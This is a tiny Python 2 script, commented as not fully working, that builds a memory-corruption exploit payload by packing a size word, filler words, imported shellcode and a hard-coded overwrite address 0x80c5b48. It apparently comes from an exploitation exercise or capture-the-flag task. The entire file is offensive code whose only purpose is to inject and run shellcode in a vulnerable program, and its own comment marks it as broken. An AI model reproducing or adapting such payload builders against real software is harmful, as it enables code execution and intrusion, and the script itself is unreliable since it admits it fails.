# Not fully working

from shellcode import shellcode
from struct import pack

print pack("<I", 0x20) + pack("<I", 0x55555555)*11 + shellcode + pack("<I", 0x80c5b48) + pack("<I", 0x55555555)